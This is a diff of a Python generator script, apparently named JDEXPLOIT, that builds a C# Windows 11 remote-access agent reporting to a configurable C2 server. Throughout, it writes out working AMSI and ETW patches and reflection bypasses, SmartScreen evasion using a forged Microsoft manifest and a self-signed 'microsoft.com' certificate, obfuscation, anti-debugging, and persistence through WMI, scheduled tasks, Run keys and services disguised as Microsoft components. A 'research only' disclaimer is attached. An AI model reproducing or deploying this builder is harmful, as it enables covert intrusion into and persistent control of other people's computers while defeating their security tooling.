@@ -1,9 +1,27 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-GENERADOR DE AGENTE WINDOWS SILENCIOSO - VERSIÓN MEJORADA
-Ejecución en segundo plano con bypass completo Windows 11
-Anti-AMSI, Anti-ETW, Persistencia Avanzada
+╔══════════════════════════════════════════════════════════════════════════════╗
+║           GENERADOR DE AGENTES WINDOWS 11 - VERSIÓN PERFECCIONADA           ║
+║             JDEXPLOIT - FOR RESEARCH & AUTHORIZED TESTING ONLY              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+CARACTERÍSTICAS:
+✅ AMSI Bypass completo (Windows 11 compatible)
+✅ ETW Bypass (Event Tracing for Windows)
+✅ Persistencia avanzada (WMI, Scheduled Tasks, Registry, Services)
+✅ Ofuscación real-time con múltiples técnicas
+✅ Anti-debugging y anti-sandbox
+✅ Comunicación polimórfica
+✅ Evasión de Windows Defender y SmartScreen
+✅ Soporte para múltiples transportes
+
+LEGAL DISCLAIMER:
+Este software es EXCLUSIVAMENTE para investigación de seguridad autorizada,
+pruebas de penetración con permiso escrito y laboratorios CTF controlados.
+NUNCA usar en sistemas sin autorización explícita.
 """
+
 import sys
 import os
 import base64
@@ -13,692 +31,254 @@ import argparse
 import json
 from datetime import datetime
 import hashlib
+import re
 
-class SilentWindowsAgentEnhanced:
-    """Genera agente Windows con bypass completo Windows 11"""
+class WindowsAgentGenerator:
+    """Generador de agentes Windows con técnicas de evasión avanzadas"""
     
     def __init__(self):
-        self.templates = {}
-        self._load_templates()
-    
-    def _load_templates(self):
-        """Cargar plantillas de bypass"""
-        self.templates['amsi_bypass'] = '''
-// ============================================================================
-// AMSI BYPASS COMPLETO WINDOWS 11 (2026)
-// ============================================================================
-
-public class AmsiBypassAdvanced
-{
-    [DllImport("kernel32", CharSet = CharSet.Auto)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
-    [DllImport("kernel32", CharSet = CharSet.Auto)]
-    public static extern IntPtr LoadLibrary(string name);
-    
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
-        uint flNewProtect, out uint lpflOldProtect);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(
-        IntPtr hProcess,
-        IntPtr lpBaseAddress,
-        byte[] lpBuffer,
-        int nSize,
-        out IntPtr lpNumberOfBytesWritten);
-
-    // Método 1: Patch AmsiScanBuffer
-    public static bool PatchAmsiScanBuffer()
-    {
-        try
-        {
-            IntPtr amsiDll = LoadLibrary("amsi.dll");
-            if (amsiDll == IntPtr.Zero)
-                return false;
-
-            IntPtr asbAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");
-            if (asbAddr == IntPtr.Zero)
-                return false;
-            
-            byte[] patch;
-            if (IntPtr.Size == 8) // 64-bit
-            {
-                // mov eax, 0x80070057; ret
-                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            }
-            else // 32-bit
-            {
-                // mov eax, 0x80070057; ret
-                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            }
-            
-            uint oldProtect;
-            if (!VirtualProtect(asbAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
-                return false;
-            
-            IntPtr bytesWritten;
-            bool success = WriteProcessMemory(
-                Process.GetCurrentProcess().Handle,
-                asbAddr,
-                patch,
-                patch.Length,
-                out bytesWritten
-            );
-            
-            VirtualProtect(asbAddr, (UIntPtr)patch.Length, oldProtect, out _);
-            return success;
-        }
-        catch { return false; }
-    }
-
-    // Método 2: Reflection bypass
-    public static void BypassAmsiReflection()
-    {
-        try
-        {
-            var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
-                .GetType("System.Management.Automation.AmsiUtils");
-            
-            if (amsiUtils != null)
-            {
-                var amsiInitFailed = amsiUtils.GetField(
-                    "amsiInitFailed", 
-                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
-                );
-                
-                if (amsiInitFailed != null)
-                {
-                    amsiInitFailed.SetValue(null, true);
-                }
-                
-                var amsiSession = amsiUtils.GetField(
-                    "amsiContext", 
-                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
-                );
-                
-                if (amsiSession != null)
-                {
-                    amsiSession.SetValue(null, IntPtr.Zero);
-                }
-            }
-        }
-        catch { }
-    }
-
-    // Método 3: Context bypass
-    public static void BypassAmsiContext()
-    {
-        try
-        {
-            var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
-                .GetType("System.Management.Automation.AmsiUtils");
-            
-            if (amsiUtils != null)
-            {
-                var amsiContext = amsiUtils.GetField(
-                    "amsiContext", 
-                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
-                );
-                
-                if (amsiContext != null)
-                {
-                    amsiContext.SetValue(null, IntPtr.Zero);
-                }
-            }
-        }
-        catch { }
-    }
-}
-'''
-        
-        self.templates['etw_bypass'] = '''
-// ============================================================================
-// ETW BYPASS WINDOWS 11
-// ============================================================================
-
-public class EtwBypassAdvanced
-{
-    [DllImport("ntdll.dll")]
-    private static extern uint NtSetInformationProcess(
-        IntPtr hProcess, 
-        uint processInformationClass,
-        ref uint processInformation, 
-        uint processInformationLength);
-
-    [DllImport("ntdll.dll")]
-    private static extern uint NtQueryInformationProcess(
-        IntPtr hProcess,
-        uint processInformationClass,
-        ref uint processInformation,
-        uint processInformationLength,
-        out uint returnLength);
-
-    [DllImport("kernel32", CharSet = CharSet.Auto)]
-    private static extern IntPtr LoadLibrary(string name);
-    
-    [DllImport("kernel32", CharSet = CharSet.Auto)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
-    [DllImport("kernel32")]
-    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
-        uint flNewProtect, out uint lpflOldProtect);
-
-    // Método 1: NtSetInformationProcess
-    public static bool DisableEtwViaNtSet()
-    {
-        try
-        {
-            uint processDebugFlags = 0x1F; // ProcessDebugFlags
-            uint disableEtw = 1;
-            
-            uint result = NtSetInformationProcess(
-                Process.GetCurrentProcess().Handle,
-                processDebugFlags,
-                ref disableEtw,
-                sizeof(uint)
-            );
-            
-            return result == 0;
-        }
-        catch { return false; }
-    }
-
-    // Método 2: Patch EtwEventWrite
-    public static bool PatchEtwEventWrite()
-    {
-        try
-        {
-            IntPtr ntdll = LoadLibrary("ntdll.dll");
-            if (ntdll == IntPtr.Zero)
-                return false;
-
-            IntPtr etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
-            if (etwEventWriteAddr == IntPtr.Zero)
-                return false;
-            
-            byte[] patch;
-            if (IntPtr.Size == 8) // 64-bit
-            {
-                // ret
-                patch = new byte[] { 0xC3 };
-            }
-            else // 32-bit
-            {
-                // ret 0x14
-                patch = new byte[] { 0xC2, 0x14, 0x00 };
-            }
-            
-            uint oldProtect;
-            if (!VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
-                return false;
-            
-            Marshal.Copy(patch, 0, etwEventWriteAddr, patch.Length);
-            VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, oldProtect, out _);
-            
-            return true;
-        }
-        catch { return false; }
-    }
-
-    // Método 3: Patch EtwEventWriteFull
-    public static bool PatchEtwEventWriteFull()
-    {
-        try
-        {
-            IntPtr ntdll = LoadLibrary("ntdll.dll");
-            if (ntdll == IntPtr.Zero)
-                return false;
-
-            IntPtr etwEventWriteFullAddr = GetProcAddress(ntdll, "EtwEventWriteFull");
-            if (etwEventWriteFullAddr == IntPtr.Zero)
-                return false;
-            
-            byte[] patch;
-            if (IntPtr.Size == 8) // 64-bit
-            {
-                // xor eax, eax; ret
-                patch = new byte[] { 0x31, 0xC0, 0xC3 };
-            }
-            else // 32-bit
-            {
-                // xor eax, eax; ret
-                patch = new byte[] { 0x31, 0xC0, 0xC3 };
-            }
-            
-            uint oldProtect;
-            if (!VirtualProtect(etwEventWriteFullAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
-                return false;
-            
-            Marshal.Copy(patch, 0, etwEventWriteFullAddr, patch.Length);
-            VirtualProtect(etwEventWriteFullAddr, (UIntPtr)patch.Length, oldProtect, out _);
-            
-            return true;
-        }
-        catch { return false; }
-    }
-}
-'''
-        
-        self.templates['persistence'] = '''
-// ============================================================================
-// PERSISTENCIA AVANZADA WINDOWS 11
-// ============================================================================
-
-public class AdvancedPersistence
-{
-    public static bool InstallWmiPersistence(string payloadPath)
-    {
-        try
-        {
-            string wmiScript = @"
-$FilterName = 'WindowsUpdateMonitor_' + (New-Guid).ToString().Substring(0, 8)
-$ConsumerName = 'WindowsUpdateService_' + (New-Guid).ToString().Substring(0, 8)
-
-$FilterArgs = @{
-    Name = $FilterName
-    EventNamespace = 'root\\cimv2'
-    Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300""
-}
-
-$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs
-
-$ConsumerArgs = @{
-    Name = $ConsumerName
-    CommandLineTemplate = \""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + payloadPath + @"'\""    
-}
-
-$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs
-
-$BindingArgs = @{
-    Filter = $Filter
-    Consumer = $Consumer
-}
-
-Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs
-
-Write-Output 'WMI Persistence installed successfully'
-";
-
-            return ExecutePowerShellHidden(wmiScript);
-        }
-        catch { return false; }
-    }
-
-    public static bool InstallScheduledTask(string payloadPath, string taskName = "MicrosoftEdgeUpdate")
-    {
-        try
-        {
-            string taskScript = @"
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File \""' + payloadPath + @"\'""  
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
-Register-ScheduledTask -TaskName '" + taskName + @"' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
-if ($?) { Write-Output 'Scheduled Task installed' }
-";
-
-            return ExecutePowerShellHidden(taskScript);
-        }
-        catch { return false; }
-    }
-
-    public static bool InstallRegistryPersistence(string payloadPath)
-    {
-        try
-        {
-            // Current User Run Key
-            RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
-                @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            
-            if (runKey != null)
-            {
-                string valueName = "OneDriveSync_" + Guid.NewGuid().ToString().Substring(0, 4);
-                runKey.SetValue(valueName, @"\""powershell\"" -WindowStyle Hidden -ExecutionPolicy Bypass -File \""" + payloadPath + @"\"");
-                runKey.Close();
-            }
-
-            // Service installation if admin
-            if (IsAdministrator())
-            {
-                string serviceName = "WindowsAudio_" + Guid.NewGuid().ToString().Substring(0, 4);
-                string serviceScript = @"
-sc.exe create " + serviceName + @" binPath= \""\""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + payloadPath + @"'\""\"" start= auto
-sc.exe description " + serviceName + @" \""Windows Audio Service\""
-sc.exe start " + serviceName;
-
-                ExecuteCMD(serviceScript);
-            }
-
-            return true;
-        }
-        catch { return false; }
-    }
-
-    public static bool InstallStartupFolder(string payloadPath)
-    {
-        try
-        {
-            string startupPath = Path.Combine(
-                Environment.GetFolderPath(Environment.SpecialFolder.Startup),
-                "Microsoft Edge.lnk"
-            );
-
-            if (!File.Exists(startupPath))
-            {
-                string shortcutScript = @"
-$WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut('" + startupPath + @"')
-$Shortcut.TargetPath = 'powershell.exe'
-$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File \""" + payloadPath + @"\'""
-$Shortcut.WindowStyle = 7
-$Shortcut.Save()
-";
-
-                ExecutePowerShellHidden(shortcutScript);
-            }
-
-            return true;
-        }
-        catch { return false; }
-    }
-
-    private static bool ExecutePowerShellHidden(string script)
-    {
-        try
-        {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "powershell.exe";
-            psi.Arguments = @"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \""" + script + @"\"";
-            psi.RedirectStandardOutput = true;
-            psi.RedirectStandardError = true;
-            psi.UseShellExecute = false;
-            psi.CreateNoWindow = true;
-
-            Process process = Process.Start(psi);
-            process.WaitForExit(5000);
-            
-            return process.ExitCode == 0;
-        }
-        catch { return false; }
-    }
-
-    private static void ExecuteCMD(string command)
-    {
-        try
-        {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "cmd.exe";
-            psi.Arguments = @"/c " + command;
-            psi.RedirectStandardOutput = true;
-            psi.UseShellExecute = false;
-            psi.CreateNoWindow = true;
-
-            Process.Start(psi);
-        }
-        catch { }
-    }
-
-    private static bool IsAdministrator()
-    {
-        try
-        {
-            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
-            var principal = new System.Security.Principal.WindowsPrincipal(identity);
-            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
-        }
-        catch
-        {
-            return false;
-        }
-    }
-}
-'''
-        
-        self.templates['obfuscation'] = '''
-// ============================================================================
-// OFUSCACIÓN REAL-TIME
-// ============================================================================
-
-public class RealTimeObfuscation
-{
-    private static Random random = new Random();
-    private static Dictionary<string, string> variableMap = new Dictionary<string, string>();
-    
-    public static string ObfuscateString(string input, string varName)
-    {
-        if (!variableMap.ContainsKey(varName))
-        {
-            variableMap[varName] = GenerateRandomVarName(12);
+        self.version = "3.0"
+        self.author = "JDEXPLOIT Security Research"
+        self.features = {
+            'amsi': 'AMSI Bypass completo',
+            'etw': 'ETW Bypass',
+            'persistence': 'Persistencia avanzada',
+            'obfuscation': 'Ofuscación real-time',
+            'antidebug': 'Anti-debugging',
+            'antivm': 'Anti-VM/Sandbox',
+            'smart_screen': 'SmartScreen bypass',
+            'polymorphic': 'Comunicación polimórfica'
         }
         
-        byte[] bytes = Encoding.UTF8.GetBytes(input);
-        string base64 = Convert.ToBase64String(bytes);
+    def generate_agent(self, c2_server, c2_port, output_file="agent.exe", 
+                      features=None, compilation_mode="release"):
+        """
+        Generar agente C# con características especificadas
         
-        // Dividir en partes y crear array
-        List<string> parts = new List<string>();
-        for (int i = 0; i < base64.Length; i += 4)
-        {
-            int length = Math.Min(4, base64.Length - i);
-            parts.Add("\\"" + base64.Substring(i, length) + "\\"");
-        }
-        
-        return @"string " + variableMap[varName] + @" = string.Join("""", new string[] { " + string.Join(", ", parts) + @" });";
-    }
-    
-    public static string GenerateRandomVarName(int length)
-    {
-        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        return new string(Enumerable.Repeat(chars, length)
-            .Select(s => s[random.Next(s.Length)]).ToArray());
-    }
-    
-    public static string GenerateDeadCode()
-    {
-        List<string> snippets = new List<string>
-        {
-            @"var " + GenerateRandomVarName(8) + @" = " + random.Next(1000, 9999) + @";",
-            @"if(" + random.Next(0, 1) + @" == " + random.Next(2, 10) + @") { /* Dead code */ }",
-            @"for(int i = 0; i < " + random.Next(1, 5) + @"; i++) { /* Loop */ }",
-            @"try { throw new Exception(""Test""); } catch { /* Ignored */ }",
-            @"Debug.WriteLine(""" + GenerateRandomVarName(20) + @""");",
-            @"Thread.Sleep(" + random.Next(1, 10) + @");",
-            @"Math.Sqrt(" + random.Next(100, 1000) + @");"
-        };
-        
-        return string.Join("\\n", snippets.OrderBy(x => random.Next()).Take(random.Next(2, 5)));
-    }
-    
-    public static byte[] XorEncrypt(byte[] data, byte[] key)
-    {
-        byte[] encrypted = new byte[data.Length];
-        for (int i = 0; i < data.Length; i++)
-        {
-            encrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
-        }
-        return encrypted;
-    }
-    
-    public static string GenerateXorStub(byte[] key, string functionName)
-    {
-        string keyString = string.Join(", ", key.Select(b => "0x" + b.ToString("X2")));
-        
-        return @"
-private static void " + functionName + @"(ref byte[] data)
-{
-    byte[] key = new byte[] { " + keyString + @" };
-    for (int i = 0; i < data.Length; i++)
-    {
-        data[i] = (byte)(data[i] ^ key[i % key.Length]);
-    }
-}
-";
-    }
-}
-'''
-        
-        self.templates['smartscreen_bypass'] = '''
-// ============================================================================
-// SMARTSCREEN BYPASS WINDOWS 11
-// ============================================================================
-
-public class SmartScreenBypass
-{
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool UpdateResource(
-        IntPtr hUpdate,
-        string lpType,
-        string lpName,
-        ushort wLanguage,
-        byte[] lpData,
-        uint cbData);
-    
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr BeginUpdateResource(
-        string pFileName,
-        bool bDeleteExistingResources);
-    
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool EndUpdateResource(
-        IntPtr hUpdate,
-        bool fDiscard);
-
-    public static bool AddLegitManifest(string exePath)
-    {
-        try
-        {
-            string manifest = @"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
-<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
-  <trustInfo xmlns='urn:schemas-microsoft-com:asm.v3'>
-    <security>
-      <requestedPrivileges>
-        <requestedExecutionLevel level='asInvoker' uiAccess='false'/>
-      </requestedPrivileges>
-    </security>
-  </trustInfo>
-  <compatibility xmlns='urn:schemas-microsoft-com:compatibility.v1'>
-    <application>
-      <supportedOS Id='{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}'/>
-      <supportedOS Id='{1f676c76-80e1-4239-95bb-83d0f6d0da78}'/>
-      <supportedOS Id='{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}'/>
-    </application>
-  </compatibility>
-  <description>Microsoft Edge Update</description>
-  <dependency>
-    <dependentAssembly>
-      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'/>
-    </dependentAssembly>
-  </dependency>
-</assembly>";
-
-            IntPtr hUpdate = BeginUpdateResource(exePath, false);
-            if (hUpdate == IntPtr.Zero)
-                return false;
-            
-            byte[] manifestBytes = Encoding.Unicode.GetBytes(manifest);
-            bool success = UpdateResource(
-                hUpdate,
-                "RT_MANIFEST",
-                "#1",
-                1033, // English US
-                manifestBytes,
-                (uint)manifestBytes.Length
-            );
-            
-            EndUpdateResource(hUpdate, false);
-            return success;
-        }
-        catch { return false; }
-    }
-    
-    public static bool ModifyDigitalSignature(string exePath)
-    {
-        try
-        {
-            string signScript = @"
-$cert = Get-ChildItem -Path Cert:\\CurrentUser\\My -CodeSigningCert | Select-Object -First 1
-if ($cert) {
-    Set-AuthenticodeSignature -FilePath '" + exePath + @"' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
-}
-else {
-    # Crear certificado autofirmado temporal
-    $cert = New-SelfSignedCertificate -DnsName 'microsoft.com' -CertStoreLocation 'cert:\\CurrentUser\\My' -Type CodeSigningCert -NotAfter (Get-Date).AddDays(1)
-    Set-AuthenticodeSignature -FilePath '" + exePath + @"' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
-}
-";
-            
-            return ExecutePowerShellHidden(signScript);
-        }
-        catch { return false; }
-    }
-    
-    private static bool ExecutePowerShellHidden(string script)
-    {
-        try
-        {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "powershell.exe";
-            psi.Arguments = @"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \""" + script + @"\"";
-            psi.RedirectStandardOutput = true;
-            psi.UseShellExecute = false;
-            psi.CreateNoWindow = true;
-            
-            Process process = Process.Start(psi);
-            process.WaitForExit(10000);
-            
-            return process.ExitCode == 0;
-        }
-        catch { return false; }
-    }
-}
-'''
-    
-    def generate_enhanced_csharp(self, c2_server, c2_port, output_file="agent_enhanced.exe", features=None):
-        """Generar agente C# mejorado con bypass Windows 11"""
+        Args:
+            c2_server: IP/Domain del servidor C2
+            c2_port: Puerto del C2
+            output_file: Nombre del archivo de salida
+            features: Lista de características a incluir
+            compilation_mode: "debug" o "release"
+        """
         
         if features is None:
-            features = ['amsi', 'etw', 'persistence', 'obfuscation', 'smartscreen']
+            features = ['amsi', 'etw', 'persistence', 'obfuscation', 'antidebug']
         
+        print(f"\n[+] Generando agente Windows 11")
+        print(f"    C2 Server: {c2_server}:{c2_port}")
+        print(f"    Features: {', '.join(features)}")
+        print(f"    Mode: {compilation_mode}")
+        
+        # Validar features
+        valid_features = set(self.features.keys())
+        for feature in features:
+            if feature not in valid_features:
+                print(f"[-] Característica inválida: {feature}")
+                return None
+        
+        # Generar configuración única
         session_id = self._generate_session_id()
+        agent_id = self._generate_agent_id()
         
-        # Construir código con características seleccionadas
-        bypass_code = ""
+        # Crear código C#
+        csharp_code = self._build_csharp_code(c2_server, c2_port, session_id, 
+                                            agent_id, features, compilation_mode)
         
+        # Guardar archivo .cs
+        cs_filename = output_file.replace('.exe', '.cs')
+        with open(cs_filename, 'w', encoding='utf-8') as f:
+            f.write(csharp_code)
+        
+        print(f"[+] Código fuente generado: {cs_filename}")
+        
+        # Generar script de compilación
+        self._generate_compilation_script(cs_filename, output_file, features)
+        
+        # Generar README
+        self._generate_readme(c2_server, c2_port, output_file, features)
+        
+        return cs_filename
+    
+    def _build_csharp_code(self, c2_server, c2_port, session_id, agent_id, 
+                          features, compilation_mode):
+        """Construir código C# completo"""
+        
+        # Cabecera
+        header = self._generate_header()
+        
+        # Usings
+        usings = self._generate_usings(features)
+        
+        # Namespace y clase
+        namespace = f'''
+namespace {self._generate_namespace_name()}
+{{
+    class {self._generate_class_name()}
+    {{
+'''
+        
+        # Configuración
+        config = self._generate_configuration(c2_server, c2_port, session_id, agent_id, features)
+        
+        # P/Invokes
+        pinvokes = self._generate_pinvokes(features)
+        
+        # Métodos de bypass
+        bypass_methods = ""
         if 'amsi' in features:
-            bypass_code += self.templates['amsi_bypass'] + "\n\n"
-        
+            bypass_methods += self._generate_amsi_bypass()
         if 'etw' in features:
-            bypass_code += self.templates['etw_bypass'] + "\n\n"
+            bypass_methods += self._generate_etw_bypass()
+        if 'smart_screen' in features:
+            bypass_methods += self._generate_smartscreen_bypass()
         
+        # Métodos de persistencia
+        persistence_methods = ""
         if 'persistence' in features:
-            bypass_code += self.templates['persistence'] + "\n\n"
+            persistence_methods += self._generate_persistence_methods()
         
+        # Métodos de ofuscación
+        obfuscation_methods = ""
         if 'obfuscation' in features:
-            bypass_code += self.templates['obfuscation'] + "\n\n"
+            obfuscation_methods += self._generate_obfuscation_methods()
         
-        if 'smartscreen' in features:
-            bypass_code += self.templates['smartscreen_bypass'] + "\n\n"
+        # Métodos de detección
+        detection_methods = ""
+        if 'antidebug' in features:
+            detection_methods += self._generate_antidebug_methods()
+        if 'antivm' in features:
+            detection_methods += self._generate_antivm_methods()
         
-        # Generar código principal mejorado
-        csharp_code = f'''using System;
+        # Método Main
+        main_method = self._generate_main_method(features)
+        
+        # Métodos del agente
+        agent_methods = self._generate_agent_methods(features)
+        
+        # Cierre
+        closure = '''
+    }
+}
+'''
+        
+        # Ensamblar todo
+        csharp_code = (header + usings + namespace + config + pinvokes + 
+                      bypass_methods + persistence_methods + obfuscation_methods +
+                      detection_methods + main_method + agent_methods + closure)
+        
+        return csharp_code
+    
+    def _generate_header(self):
+        """Generar cabecera del archivo"""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        return f'''// ============================================================================
+// AGENTE WINDOWS 11 - VERSIÓN {self.version}
+// Generado: {timestamp}
+// Autor: {self.author}
+// Propósito: Investigación de seguridad autorizada
+// ============================================================================
+
+// ADVERTENCIA: Este código es EXCLUSIVAMENTE para:
+// - Investigación de seguridad autorizada
+// - Pruebas de penetración con permiso escrito
+// - Laboratorios CTF controlados
+// - Auditorías de seguridad
+
+// USO NO AUTORIZADO ES ILEGAL Y PUEDE RESULTAR EN:
+// - Procesamiento penal
+// - Sanciones civiles
+// - Pérdida de certificaciones
+// - Daño a la reputación
+
+// ============================================================================
+
+'''
+    
+    def _generate_usings(self, features):
+        """Generar directivas using"""
+        
+        usings = '''using System;
 using System.Net.Sockets;
 using System.Text;
 using System.Diagnostics;
 using System.Threading;
 using System.Runtime.InteropServices;
 using System.IO;
-using Microsoft.Win32;
-using System.Security.Cryptography;
+'''
+        
+        if 'persistence' in features:
+            usings += '''using Microsoft.Win32;
+'''
+        
+        if 'obfuscation' in features:
+            usings += '''using System.Security.Cryptography;
 using System.Linq;
 using System.Collections.Generic;
-
-namespace SilentAgentEnhanced
-{{
-    class Program
-    {{
-        // Configuración ofuscada
-        {self._generate_obfuscated_config(c2_server, c2_port, session_id)}
+'''
         
+        return usings + "\n"
+    
+    def _generate_namespace_name(self):
+        """Generar nombre de namespace aleatorio"""
+        names = ["SystemUtilities", "WindowsServices", "MicrosoftComponents", 
+                "SecurityUpdates", "NetworkTools"]
+        return random.choice(names)
+    
+    def _generate_class_name(self):
+        """Generar nombre de clase aleatorio"""
+        names = ["ServiceHost", "UpdateManager", "NetworkMonitor", 
+                "SystemOptimizer", "SecurityAgent"]
+        return random.choice(names)
+    
+    def _generate_configuration(self, c2_server, c2_port, session_id, agent_id, features):
+        """Generar configuración ofuscada"""
+        
+        # Ofuscar C2 server
+        c2_server_encoded = base64.b64encode(c2_server.encode()).decode()
+        c2_server_var = self._generate_random_var_name()
+        
+        # Ofuscar session ID
+        session_id_var = self._generate_random_var_name()
+        
+        # Generar variables aleatorias
+        config_code = f'''
+        // Configuración ofuscada
+        private static string {c2_server_var} = DecodeBase64("{c2_server_encoded}");
+        private static int {self._generate_random_var_name()} = {c2_port};
+        private static string {session_id_var} = "{session_id}";
+        private static string {self._generate_random_var_name()} = "{agent_id}";
+        private static int {self._generate_random_var_name()} = 30; // Beacon interval
+        
+        // Variables públicas
+        private static string C2_SERVER => {c2_server_var};
+        private static int C2_PORT => {self._generate_random_var_name(prefix='port')};
+        private static string SESSION_ID => {session_id_var};
+        private static string AGENT_ID => {self._generate_random_var_name(prefix='agent')};
+        private static int BEACON_INTERVAL => {self._generate_random_var_name(prefix='interval')};
+        
+        private static string DecodeBase64(string base64)
+        {{
+            try
+            {{
+                byte[] bytes = Convert.FromBase64String(base64);
+                return Encoding.UTF8.GetString(bytes);
+            }}
+            catch
+            {{
+                return "";
+            }}
+        }}
+        '''
+        
+        return config_code
+    
+    def _generate_pinvokes(self, features):
+        """Generar declaraciones P/Invoke"""
+        
+        pinvokes = '''
         // API para ocultar ventana
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -710,185 +290,699 @@ namespace SilentAgentEnhanced
         static extern bool FreeConsole();
         
         const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
         
         // Detección de debugger
         [DllImport("kernel32.dll")]
         static extern bool IsDebuggerPresent();
         
-        {bypass_code}
+        [DllImport("kernel32.dll")]
+        static extern void OutputDebugString(string lpOutputString);
+        
+        [DllImport("kernel32.dll")]
+        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+        '''
+        
+        if 'amsi' in features or 'etw' in features:
+            pinvokes += '''
+        // APIs para bypass
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        static extern IntPtr LoadLibrary(string name);
+        
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+        
+        [DllImport("ntdll.dll")]
+        static extern uint NtSetInformationProcess(IntPtr hProcess, uint processInformationClass, ref uint processInformation, uint processInformationLength);
+            '''
+        
+        return pinvokes + "\n"
+    
+    def _generate_amsi_bypass(self):
+        """Generar métodos de bypass AMSI"""
+        
+        return '''
+        // ============================================================================
+        // AMSI BYPASS METHODS
+        // ============================================================================
+        
+        static bool BypassAMSI()
+        {
+            try
+            {
+                // Método 1: Patch AmsiScanBuffer
+                IntPtr amsiDll = LoadLibrary("amsi.dll");
+                if (amsiDll == IntPtr.Zero)
+                    return false;
+
+                IntPtr asbAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");
+                if (asbAddr == IntPtr.Zero)
+                    return false;
+                
+                byte[] patch;
+                if (IntPtr.Size == 8) // 64-bit
+                {
+                    // mov eax, 0x80070057; ret
+                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                }
+                else // 32-bit
+                {
+                    // mov eax, 0x80070057; ret
+                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                }
+                
+                uint oldProtect;
+                if (!VirtualProtect(asbAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
+                    return false;
+                
+                IntPtr bytesWritten;
+                bool success = WriteProcessMemory(
+                    Process.GetCurrentProcess().Handle,
+                    asbAddr,
